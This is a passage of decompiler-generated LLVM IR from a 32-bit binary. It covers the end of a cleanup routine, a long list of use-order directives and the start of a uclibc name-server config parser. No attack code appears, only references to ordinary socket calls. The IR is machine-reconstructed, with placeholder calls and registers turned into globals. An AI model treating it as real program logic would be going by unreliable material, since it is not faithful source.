  %v1_8055be2 = inttoptr i32 %v0_8055bdd to i32*
  store i32 -1, i32* %v1_8055be2, align 4
  %v0_8055be8 = load i32, i32* @esp, align 4
  %v1_8055be8 = add i32 %v0_8055be8, 56
  %v2_8055be8 = inttoptr i32 %v1_8055be8 to i32*
  %v3_8055be8 = load i32, i32* %v2_8055be8, align 4
  store i32 %v3_8055be8, i32* %eax.global-to-local, align 4
  %v2_8055bec = add i32 %v0_8055be8, 44
  %v3_8055bec = inttoptr i32 %v2_8055bec to i32*
  store i32 %v3_8055be8, i32* %v3_8055bec, align 4
  br label %dec_label_pc_8055bf0

dec_label_pc_8055bf0:                             ; preds = %dec_label_pc_8055955, %dec_label_pc_805592d, %dec_label_pc_8055bdd
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8055bdd ], [ %v0_80555df, %dec_label_pc_8055955 ], [ %v0_80555df, %dec_label_pc_805592d ]
  %v0_8055bf0 = load i32, i32* @esp, align 4
  %v1_8055bf0 = add i32 %v0_8055bf0, 20
  %v2_8055bf0 = inttoptr i32 %v1_8055bf0 to i32*
  %v3_8055bf0 = load i32, i32* %v2_8055bf0, align 4
  %v13_8055bf0 = icmp eq i32 %v3_8055bf0, -1
  br i1 %v13_8055bf0, label %dec_label_pc_8055bf0.dec_label_pc_8055c06_crit_edge, label %dec_label_pc_8055bf7

dec_label_pc_8055bf0.dec_label_pc_8055c06_crit_edge: ; preds = %dec_label_pc_8055bf0
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8055c06

dec_label_pc_8055bf7:                             ; preds = %dec_label_pc_8055bf0
  %v3_8055bfa = load i32, i32* %v2_8055bf0, align 4
  %v5_8055bfa = add i32 %v0_8055bf0, -16
  %v6_8055bfa = inttoptr i32 %v5_8055bfa to i32*
  store i32 %v3_8055bfa, i32* %v6_8055bfa, align 4
  %v1_8055bfe = sext i16 %stack_var_-180.1 to i32
  %v2_8055bfe = call i32 @__libc_close(i32 %v1_8055bfe)
  store i32 %v2_8055bfe, i32* %eax.global-to-local, align 4
  %v0_8055c03 = load i32, i32* @esp, align 4
  %v1_8055c03 = add i32 %v0_8055c03, 16
  br label %dec_label_pc_8055c06

dec_label_pc_8055c06:                             ; preds = %dec_label_pc_8055bf0.dec_label_pc_8055c06_crit_edge, %dec_label_pc_8055bf7
  %v1_8055c0d.pre-phi = phi i32 [ %.pre, %dec_label_pc_8055bf0.dec_label_pc_8055c06_crit_edge ], [ %v1_8055bfe, %dec_label_pc_8055bf7 ]
  %v0_8055c06 = phi i32 [ %v0_8055bf0, %dec_label_pc_8055bf0.dec_label_pc_8055c06_crit_edge ], [ %v1_8055c03, %dec_label_pc_8055bf7 ]
  %v1_8055c09 = add i32 %v0_8055c06, 12
  %v2_8055c09 = inttoptr i32 %v1_8055c09 to i32*
  %v3_8055c09 = load i32, i32* %v2_8055c09, align 4
  %v5_8055c09 = add i32 %v0_8055c06, -16
  %v6_8055c09 = inttoptr i32 %v5_8055c09 to i32*
  store i32 %v3_8055c09, i32* %v6_8055c09, align 4
  %v2_8055c0d = call i32 @free(i32 %v1_8055c0d.pre-phi)
  store i32 %v2_8055c0d, i32* %eax.global-to-local, align 4
  %v1_8055c12 = load i32, i32* @esp, align 4
  %v2_8055c12 = inttoptr i32 %v1_8055c12 to i32*
  store i32 %v2_805554a, i32* %v2_8055c12, align 4
  %v2_8055c15 = call i32 @free(i32 %v1_8055c0d.pre-phi)
  store i32 %v2_8055c15, i32* @eax, align 4
  %v0_8055c1a = load i32, i32* @esp, align 4
  %v1_8055c1d = add i32 %v0_8055c1a, 56
  %v2_8055c1d = inttoptr i32 %v1_8055c1d to i32*
  %v3_8055c1d = load i32, i32* %v2_8055c1d, align 4
  %v13_8055c1d = icmp eq i32 %v3_8055c1d, -1
  %v1_8055c22 = add i32 %v0_8055c1a, 32
  %v2_8055c22 = inttoptr i32 %v1_8055c22 to i32*
  store i32 -1, i32* %v2_8055c22, align 4
  br i1 %v13_8055c1d, label %dec_label_pc_8055c06.dec_label_pc_8055c79_crit_edge, label %dec_label_pc_8055c2c

dec_label_pc_8055c06.dec_label_pc_8055c79_crit_edge: ; preds = %dec_label_pc_8055c06
  %v0_8055c79.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c79

dec_label_pc_8055c2c:                             ; preds = %dec_label_pc_8055c06
  %v0_8055c2c = load i32, i32* @ecx, align 4
  %v1_8055c2c = load i32, i32* @esp, align 4
  %v2_8055c2c = add i32 %v1_8055c2c, -4
  %v3_8055c2c = inttoptr i32 %v2_8055c2c to i32*
  store i32 %v0_8055c2c, i32* %v3_8055c2c, align 4
  %v1_8055c2d = add i32 %v1_8055c2c, -8
  %v2_8055c2d = inttoptr i32 %v1_8055c2d to i32*
  store i32 ptrtoint (i8** @global_var_80687e8.787 to i32), i32* %v2_8055c2d, align 4
  %v1_8055c32 = add i32 %v1_8055c2c, -12
  %v2_8055c32 = inttoptr i32 %v1_8055c32 to i32*
  store i32 134562299, i32* %v2_8055c32, align 4
  %v1_8055c37 = add i32 %v1_8055c2c, 184
  store i32 %v1_8055c37, i32* %ebx.global-to-local, align 4
  %v2_8055c3e = add i32 %v1_8055c2c, -16
  %v3_8055c3e = inttoptr i32 %v2_8055c3e to i32*
  store i32 %v1_8055c37, i32* %v3_8055c3e, align 4
  %v3_8055c3f = call i32 @__pthread_return_void(i32 %v1_8055c0d.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055c3f, i32* %eax.global-to-local, align 4
  %v0_8055c44 = load i32, i32* @esp, align 4
  %v1_8055c44 = inttoptr i32 %v0_8055c44 to i32*
  store i32 ptrtoint (i8** @global_var_80687e8.787 to i32), i32* %v1_8055c44, align 4
  %v2_8055c4b = call i32 @__pthread_return_0(i32 %v1_8055c0d.pre-phi)
  store i32 %v2_8055c4b, i32* %eax.global-to-local, align 4
  %v0_8055c50 = load i32, i32* @esp, align 4
  %v1_8055c50 = add i32 %v0_8055c50, 60
  %v2_8055c50 = inttoptr i32 %v1_8055c50 to i32*
  %v3_8055c50 = load i32, i32* %v2_8055c50, align 4
  store i32 %v3_8055c50, i32* %eax.global-to-local, align 4
  %v1_8055c54 = add i32 %v0_8055c50, 56
  %v2_8055c54 = inttoptr i32 %v1_8055c54 to i32*
  %v3_8055c54 = load i32, i32* %v2_8055c54, align 4
  store i32 %v3_8055c54, i32* %edx.global-to-local, align 4
  %v1_8055c58 = trunc i32 %v3_8055c50 to i16
  store i16 %v1_8055c58, i16* @global_var_8062544.789, align 4
  %v1_8055c5e = inttoptr i32 %v0_8055c50 to i32*
  %v2_8055c5e = load i32, i32* %v1_8055c5e, align 4
  store i32 %v2_8055c5e, i32* @eax, align 4
  %v3_8055c5e = add i32 %v0_8055c50, 4
  %v1_8055c5f = sext i32 %v3_8055c54 to i64
  store i64 %v1_8055c5f, i64* @global_var_8068800.788, align 2048
  %v1_8055c65 = inttoptr i32 %v3_8055c5e to i32*
  %v2_8055c65 = load i32, i32* %v1_8055c65, align 4
  store i32 %v2_8055c65, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055c65, align 4
  %v0_8055c68 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055c68, i32* %v1_8055c5e, align 4
  %v3_8055c69 = call i32 @__pthread_return_void(i32 %v1_8055c0d.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055c69, i32* %eax.global-to-local, align 4
  %v0_8055c6e = load i32, i32* @esp, align 4
  %v1_8055c6e = add i32 %v0_8055c6e, 32
  %v2_8055c6e = inttoptr i32 %v1_8055c6e to i32*
  store i32 -1, i32* %v2_8055c6e, align 4
  br label %dec_label_pc_8055c76

dec_label_pc_8055c76:                             ; preds = %dec_label_pc_8055aea, %dec_label_pc_8055c2c
  %v0_8055c76 = load i32, i32* @esp, align 4
  %v1_8055c76 = add i32 %v0_8055c76, 16
  br label %dec_label_pc_8055c79

dec_label_pc_8055c79:                             ; preds = %dec_label_pc_8055c06.dec_label_pc_8055c79_crit_edge, %dec_label_pc_8055c76
  %v0_8055c79 = phi i32 [ %v0_8055c79.pre, %dec_label_pc_8055c06.dec_label_pc_8055c79_crit_edge ], [ %v1_8055c76, %dec_label_pc_8055c76 ]
  %v1_8055c79 = add i32 %v0_8055c79, 16
  %v2_8055c79 = inttoptr i32 %v1_8055c79 to i32*
  %v3_8055c79 = load i32, i32* %v2_8055c79, align 4
  store i32 %v3_8055c79, i32* %eax.global-to-local, align 4
  %v1_8055c7d = add i32 %v0_8055c79, 220
  %v1_8055c83 = inttoptr i32 %v1_8055c7d to i32*
  %v2_8055c83 = load i32, i32* %v1_8055c83, align 4
  store i32 %v2_8055c83, i32* @ebx, align 4
  %v3_8055c83 = add i32 %v0_8055c79, 224
  %v1_8055c84 = inttoptr i32 %v3_8055c83 to i32*
  %v2_8055c84 = load i32, i32* %v1_8055c84, align 4
  store i32 %v2_8055c84, i32* @esi, align 4
  %v3_8055c84 = add i32 %v0_8055c79, 228
  %v1_8055c85 = inttoptr i32 %v3_8055c84 to i32*
  %v2_8055c85 = load i32, i32* %v1_8055c85, align 4
  store i32 %v2_8055c85, i32* @edi, align 4
  %v3_8055c85 = add i32 %v0_8055c79, 232
  %v1_8055c86 = inttoptr i32 %v3_8055c85 to i32*
  %v2_8055c86 = load i32, i32* %v1_8055c86, align 4
  store i32 %v2_8055c86, i32* @ebp, align 4
  ret i32 %v3_8055c79

; uselistorder directives
  uselistorder i32 %v0_8055c79, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055c50, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055c06, { 1, 0 }
  uselistorder i32 %v1_8055c0d.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8055bb8.pre, { 1, 0 }
  uselistorder i32 %v5_8055b8b, { 1, 0 }
  uselistorder i32 %v3_8055b8b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8055b53, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8055b1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055aea, { 1, 0 }
  uselistorder i32 %v3_8055ac9, { 1, 0, 2 }
  uselistorder i32 %v0_8055aba, { 1, 0 }
  uselistorder i32 %v5_8055ab0, { 1, 0 }
  uselistorder i32* %v3_8055ab0, { 1, 0 }
  uselistorder i32 %v0_805598667, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8055ab0, { 2, 1, 0 }
  uselistorder i32 %v5_8055aaa, { 1, 0 }
  uselistorder i32 %v1_8055aa9, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8055aa5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055a69, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8055a43, { 1, 0 }
  uselistorder i32 %v1_8055a34, { 1, 0 }
  uselistorder i32 %v3_8055a05, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80559f3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805599a, { 1, 2, 0 }
  uselistorder i32 %v0_805599a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8055974, { 1, 0 }
  uselistorder i32 %v0_805597c, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_805596a, { 1, 0, 2 }
  uselistorder i32 %v5_8055916, { 1, 0 }
  uselistorder i32* %v2_8055916, { 1, 0, 2 }
  uselistorder i32 %v3_80558ce, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80558b4, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8055893, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055873, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055819, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80557fe, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80557e7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805576f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055722, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055703, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80556e7, { 1, 0 }
  uselistorder i32 %v3_80556dc, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80556d9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_805567e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8055679, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8055662, { 1, 0 }
  uselistorder i32 %v1_805562e, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805561f83, { 2, 1, 0 }
  uselistorder i16 %v0_80555df, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80555d8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805554a, { 1, 6, 2, 10, 8, 3, 7, 11, 0, 4, 5, 9, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 9, 8, 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 160, { 0, 2, 1, 3 }
  uselistorder i32 68, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 10, 0 }
  uselistorder i32 17, { 18, 15, 6, 14, 3, 4, 2, 7, 8, 9, 10, 1, 19, 5, 16, 11, 17, 12, 13, 0 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_8062544.789, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8068800.788, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80687e8.787 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80687e8.787, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055c79, { 1, 0 }
  uselistorder label %dec_label_pc_8055c76, { 1, 0 }
  uselistorder label %dec_label_pc_8055c06, { 1, 0 }
  uselistorder label %dec_label_pc_8055bf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055bdd, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8055bb8.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055bb0, { 1, 0 }
  uselistorder label %dec_label_pc_8055b97, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055b4c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8055aea, { 1, 0 }
  uselistorder label %dec_label_pc_8055aba, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8055ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055aa2, { 1, 0 }
  uselistorder label %dec_label_pc_8055a1d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055974, { 1, 0 }
  uselistorder label %dec_label_pc_80557e7, { 1, 0 }
  uselistorder label %dec_label_pc_80557b0, { 1, 0 }
  uselistorder label %dec_label_pc_8055722, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805562e, { 1, 0 }
  uselistorder label %dec_label_pc_8055618, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8055c88 = load i32, i32* @ebp, align 4
  store i32 134562299, i32* %stack_var_-216, align 4
  %v3_8055c97 = ptrtoint i32* %stack_var_-216 to i32
  %v2_8055c9c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055c9c, i32* @eax, align 4
  %v2_8055ca4 = call i32 @__pthread_return_void(i32 %v2_8055c9c, i32 134562299)
  %v1_8055cb0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062548.726 to i32))
  store i32 %v1_8055cb0, i32* @eax, align 4
  %v0_8055cb8 = load i32, i32* @global_var_8068c34.727, align 4
  %tmp41 = icmp slt i32 %v0_8055cb8, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8055eaf, label %dec_label_pc_8055cc5

dec_label_pc_8055cc5:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8061770.792 to i32), i32* %stack_var_-216, align 4
  %v2_8055cd1 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_806173e.793 to i32), i32 ptrtoint (i32* @global_var_8061770.792 to i32))
  store i32 %v2_8055cd1, i32* @eax, align 4
  %v1_8055cd9 = icmp eq i32 %v2_8055cd1, 0
  store i32 %v2_8055cd1, i32* @ebp, align 4
  %v1_8055cdd = icmp eq i1 %v1_8055cd9, false
  br i1 %v1_8055cdd, label %dec_label_pc_8055e7a.preheader, label %dec_label_pc_8055ce3

dec_label_pc_8055ce3:                             ; preds = %dec_label_pc_8055cc5
  store i32 ptrtoint (i32* @global_var_8061770.792 to i32), i32* %stack_var_-216, align 4
  %v2_8055cef = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_806174f.794 to i32), i32 ptrtoint (i32* @global_var_8061770.792 to i32))
  %v1_8055cf7 = icmp eq i32 %v2_8055cef, 0
  store i32 %v2_8055cef, i32* @ebp, align 4
  %v1_8055cfb = icmp eq i1 %v1_8055cf7, false
  br i1 %v1_8055cfb, label %dec_label_pc_8055e7a.preheader, label %dec_label_pc_8055ea4

dec_label_pc_8055e7a.preheader:                   ; preds = %dec_label_pc_8055cc5, %dec_label_pc_8055ce3
  %v2_8055e81 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8055db5 = add i32 %v3_8055c97, 164
  %v4_8055da4 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8055e7a

dec_label_pc_8055d06:                             ; preds = %dec_label_pc_8055d11
  %v1_8055d06 = add i32 %v0_8055d0656, 1
  store i32 %v1_8055d06, i32* @ebx, align 4
  %v1_8055d07 = inttoptr i32 %v1_8055d06 to i8*
  %v2_8055d07 = load i8, i8* %v1_8055d07, align 1
  %v3_8055d07 = zext i8 %v2_8055d07 to i32
  %v5_8055d07 = and i32 %v6_8055d0759, -256
  %v6_8055d07 = or i32 %v3_8055d07, %v5_8055d07
  store i32 %v6_8055d07, i32* @ecx, align 4
  %v4_8055d09 = icmp eq i8 %v2_8055d07, 0
  br i1 %v4_8055d09, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d11

dec_label_pc_8055d11:                             ; preds = %dec_label_pc_8055d11.lr.ph, %dec_label_pc_8055d06
  %v6_8055d0759 = phi i32 [ %v6_8055d0753, %dec_label_pc_8055d11.lr.ph ], [ %v6_8055d07, %dec_label_pc_8055d06 ]
  %v2_8055d0758 = phi i8 [ %v2_8055d0750, %dec_label_pc_8055d11.lr.ph ], [ %v2_8055d07, %dec_label_pc_8055d06 ]
  %v1_8055d0757 = phi i8* [ %v1_8055d0749, %dec_label_pc_8055d11.lr.ph ], [ %v1_8055d07, %dec_label_pc_8055d06 ]
  %v0_8055d0656 = phi i32 [ %v0_8055d07.pre, %dec_label_pc_8055d11.lr.ph ], [ %v1_8055d06, %dec_label_pc_8055d06 ]
  store i32 %v0_8055d11.pre, i32* @eax, align 4
  %v2_8055d16 = sext i8 %v2_8055d0758 to i32
  store i32 %v2_8055d16, i32* @edx, align 4
  %v2_8055d19 = mul nsw i32 %v2_8055d16, 2
  %v3_8055d19 = add i32 %v0_8055d11.pre, %v2_8055d19
  %v4_8055d19 = inttoptr i32 %v3_8055d19 to i8*
  %v5_8055d19 = load i8, i8* %v4_8055d19, align 1
  %v6_8055d19 = and i8 %v5_8055d19, 32
  %v7_8055d19 = icmp eq i8 %v6_8055d19, 0
  %v1_8055d1d = icmp eq i1 %v7_8055d19, false
  br i1 %v1_8055d1d, label %dec_label_pc_8055d06, label %dec_label_pc_8055d1f

dec_label_pc_8055d1f:                             ; preds = %dec_label_pc_8055d11
  %v10_8055d1f = icmp eq i8 %v2_8055d0758, 10
  br i1 %v10_8055d1f, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d28

dec_label_pc_8055d28:                             ; preds = %dec_label_pc_8055d1f
  %v10_8055d28 = icmp eq i8 %v2_8055d0758, 35
  %v1_8055d33 = icmp eq i1 %v10_8055d28, false
  br i1 %v1_8055d33, label %dec_label_pc_8055d84.preheader, label %dec_label_pc_8055e7a

dec_label_pc_8055d84.preheader:                   ; preds = %dec_label_pc_8055d28
  %v2_8055d846 = load i8, i8* %v1_8055d0757, align 1
  %v3_8055d847 = icmp eq i8 %v2_8055d846, 0
  br i1 %v3_8055d847, label %dec_label_pc_8055d90, label %dec_label_pc_8055d89

dec_label_pc_8055d3a:                             ; preds = %dec_label_pc_8055d89
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8055d3e = load i32, i32* @esp, align 4
  %v3_8055d3e = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8055d3e = add nuw nsw i32 %v3_8055d3e, 152
  %v5_8055d3e = add i32 %v4_8055d3e, %v1_8055d3e
  %v6_8055d3e = inttoptr i32 %v5_8055d3e to i32*
  store i32 %v0_8055d3e, i32* %v6_8055d3e, align 4
  %v0_8055d48.pre = load i32, i32* @ebx, align 4
  %v4_8055d48.pre = load i32, i32* @ecx, align 4
  %v1_8055d4860 = inttoptr i32 %v0_8055d48.pre to i8*
  %v2_8055d4861 = load i8, i8* %v1_8055d4860, align 1
  %v3_8055d4862 = zext i8 %v2_8055d4861 to i32
  %v5_8055d4863 = and i32 %v4_8055d48.pre, -256
  %v6_8055d4864 = or i32 %v3_8055d4862, %v5_8055d4863
  %v4_8055d4a65 = icmp eq i8 %v2_8055d4861, 0
  br i1 %v4_8055d4a65, label %dec_label_pc_8055d67.preheader, label %dec_label_pc_8055d4e.lr.ph

dec_label_pc_8055d4e.lr.ph:                       ; preds = %dec_label_pc_8055d3a
  %v0_8055d4e.pre = load i32, i32* @global_var_80622cc, align 4
  br label %dec_label_pc_8055d4e

dec_label_pc_8055d47:                             ; preds = %dec_label_pc_8055d5c
  %v1_8055d47 = add i32 %v0_8055d4767, 1
  store i32 %v1_8055d47, i32* @ebx, align 4
  %v1_8055d48 = inttoptr i32 %v1_8055d47 to i8*
  %v2_8055d48 = load i8, i8* %v1_8055d48, align 1
  %v3_8055d48 = zext i8 %v2_8055d48 to i32
  %v5_8055d48 = and i32 %v6_8055d4869, -256
  %v6_8055d48 = or i32 %v3_8055d48, %v5_8055d48
  %v4_8055d4a = icmp eq i8 %v2_8055d48, 0
  br i1 %v4_8055d4a, label %dec_label_pc_8055d67.preheader, label %dec_label_pc_8055d4e

dec_label_pc_8055d4e:                             ; preds = %dec_label_pc_8055d4e.lr.ph, %dec_label_pc_8055d47
  %v6_8055d4869 = phi i32 [ %v6_8055d4864, %dec_label_pc_8055d4e.lr.ph ], [ %v6_8055d48, %dec_label_pc_8055d47 ]
  %v2_8055d4868 = phi i8 [ %v2_8055d4861, %dec_label_pc_8055d4e.lr.ph ], [ %v2_8055d48, %dec_label_pc_8055d47 ]
  %v0_8055d4767 = phi i32 [ %v0_8055d48.pre, %dec_label_pc_8055d4e.lr.ph ], [ %v1_8055d47, %dec_label_pc_8055d47 ]
  store i32 %v0_8055d4e.pre, i32* @eax, align 4
  %v2_8055d53 = sext i8 %v2_8055d4868 to i32
  store i32 %v2_8055d53, i32* @edx, align 4
  %v2_8055d56 = mul nsw i32 %v2_8055d53, 2
  %v3_8055d56 = add i32 %v0_8055d4e.pre, %v2_8055d56
  %v4_8055d56 = inttoptr i32 %v3_8055d56 to i8*
  %v5_8055d56 = load i8, i8* %v4_8055d56, align 1
  %v6_8055d56 = and i8 %v5_8055d56, 32
  %v7_8055d56 = icmp eq i8 %v6_8055d56, 0
  %v1_8055d5a = icmp eq i1 %v7_8055d56, false
  br i1 %v1_8055d5a, label %dec_label_pc_8055d67.preheader, label %dec_label_pc_8055d5c

dec_label_pc_8055d5c:                             ; preds = %dec_label_pc_8055d4e
  %v10_8055d5c = icmp eq i8 %v2_8055d4868, 10
  %v1_8055d5f = icmp eq i1 %v10_8055d5c, false
  br i1 %v1_8055d5f, label %dec_label_pc_8055d47, label %dec_label_pc_8055d67.preheader

dec_label_pc_8055d67.preheader:                   ; preds = %dec_label_pc_8055d5c, %dec_label_pc_8055d4e, %dec_label_pc_8055d47, %dec_label_pc_8055d3a
  %v0_8055d47.lcssa = phi i32 [ %v0_8055d48.pre, %dec_label_pc_8055d3a ], [ %v1_8055d47, %dec_label_pc_8055d47 ], [ %v0_8055d4767, %dec_label_pc_8055d4e ], [ %v0_8055d4767, %dec_label_pc_8055d5c ]
  %v6_8055d48.lcssa = phi i32 [ %v6_8055d4864, %dec_label_pc_8055d3a ], [ %v6_8055d48, %dec_label_pc_8055d47 ], [ %v6_8055d4869, %dec_label_pc_8055d4e ], [ %v6_8055d4869, %dec_label_pc_8055d5c ]
  %v1_8055d6775 = inttoptr i32 %v0_8055d47.lcssa to i8*
  %v2_8055d6776 = load i8, i8* %v1_8055d6775, align 1
  %v3_8055d6777 = zext i8 %v2_8055d6776 to i32
  %v5_8055d6778 = and i32 %v6_8055d48.lcssa, -256
  %v6_8055d6779 = or i32 %v3_8055d6777, %v5_8055d6778
  store i32 %v6_8055d6779, i32* @ecx, align 4
  %v4_8055d6980 = icmp eq i8 %v2_8055d6776, 0
  br i1 %v4_8055d6980, label %dec_label_pc_8055d80, label %dec_label_pc_8055d6d

dec_label_pc_8055d63:                             ; preds = %dec_label_pc_8055d7b, %dec_label_pc_8055d6d
  store i8 0, i8* %v1_8055d6783, align 1
  %v0_8055d66 = load i32, i32* @ebx, align 4
  %v1_8055d66 = add i32 %v0_8055d66, 1
  store i32 %v1_8055d66, i32* @ebx, align 4
  %v4_8055d67.pre = load i32, i32* @ecx, align 4
  %v1_8055d67 = inttoptr i32 %v1_8055d66 to i8*
  %v2_8055d67 = load i8, i8* %v1_8055d67, align 1
  %v3_8055d67 = zext i8 %v2_8055d67 to i32
